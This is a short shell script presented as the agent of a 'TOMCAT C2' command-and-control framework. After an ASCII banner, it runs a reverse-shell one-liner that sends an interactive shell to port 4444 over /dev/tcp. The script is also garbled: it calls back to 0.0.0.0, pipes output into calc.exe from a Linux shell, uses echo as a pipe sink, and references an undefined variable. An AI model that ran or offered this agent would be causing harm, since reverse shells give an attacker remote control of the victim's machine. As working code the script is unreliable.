#!/usr/bin/sh
# Author: TOM7

green=$(tput setaf 2 2>/dev/null || echo "")
red=$(tput setaf 1 2>/dev/null || echo "")
cyan=$(tput setaf 6 2>/dev/null || echo "")
reset="${normal}"

XBanner="""
$red
___________________      _____  _________     ________________
\\__    ___/\\_____  \\    /     \\ \\_   ___ \\   /  _  \\__    ___/
  |    |    /   |   \\  /  \\ /  \\/    \\  \\/  /  /_\\  \\|    |   
  |    |   /    |    \\/    Y    \\     \\____/    |    \\    |   
  |____|   \\_______  /\\____|__  /\\______  /\\____|__  /____|   
                   \\/         \\/        \\/         \\/         

            <   TOMCAT C2 Frameworks V2 Agent   />
$reset
"""

echo "$XBanner"

command="sh -i >& /dev/tcp/0.0.0.0/4444 0>&1"
echo "$green Starting Shell Session $reset"
cd /
echo "$command" | bash | calc.exe | echo "$cyan Session Opened! $reset"
